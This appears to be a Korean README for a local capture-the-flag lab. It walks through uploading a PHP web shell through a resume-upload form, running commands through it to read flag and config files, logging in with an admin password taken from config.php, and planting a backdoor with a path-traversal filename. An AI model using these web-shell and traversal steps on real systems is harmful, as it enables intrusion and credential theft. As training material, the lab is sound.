## 📁 파일 구조

```
techcorp-wargame/
├── app.py                      # Flask 애플리케이션
├── flag1.txt                   # Level 1 FLAG
├── flag3.txt                   # Level 3 FLAG
├── uploads/                    # 업로드된 파일 저장소
├── admin/
│   ├── config.php             # 데이터베이스 설정
│   ├── login.php              # 관리자 로그인 페이지
│   └── dashboard.php          # Level 2 FLAG 위치
└── templates/
    ├── index.html
    ├── apply.html
    └── applications.html
```

## 🚀 설치 및 실행

### 필요 사항
- Python 3.7+
- Flask

### 설치
```bash
pip install flask
```

### 실행
```bash
python app.py
```

서버가 `http://localhost:5000`에서 실행

## 🎮 Level 1: 웹셸 업로드 

1. `shell.php` 파일 준비
2. 채용 지원 페이지에서 이력서로 업로드
3. 업로드된 파일 경로를 확인 (`/uploads/shell.php`)
4. 웹셸에 접근하여 명령어를 실행 
   ```
   http://localhost:5000/uploads/shell.php?cmd=cat flag1.txt
   ```

## 🎮 Level 2: 정보 수집 → Admin 로그인

1. Level 1에서 획득한 웹셸을 사용하여 파일 목록을 확인
   ```
   ?cmd=ls -la
   ```
2. admin 폴더를 탐색 
   ```
   ?cmd=ls -la admin/
   ```
3. config.php 파일을 읽는다. 
   ```
   ?cmd=cat admin/config.php
   ```
5. 발견한 관리자 비밀번호를 사용하여 로그인 
   - URL: `http://localhost:5000/admin/login.php`
   - Username: `admin`
   - Password: `techcorp_admin_2024`
6. 관리자 대시보드에서 FLAG2를 확인

## 🎮 Level 3: Path Traversal 

1. 새로운 웹셸을 준비
2. 파일명을 다음과 같이 설정
   ```
   ../../admin/backdoor.php.pdf
   ```
3. 채용 지원 페이지에서 업로드
4. admin 폴더에 직접 접근
   ```
   http://localhost:5000/admin/backdoor.php
   ```
5. 웹셸을 통해 FLAG3를 읽는다. 
   ```
   http://localhost:5000/admin/backdoor.php?cmd=cat ../flag3.txt
   ```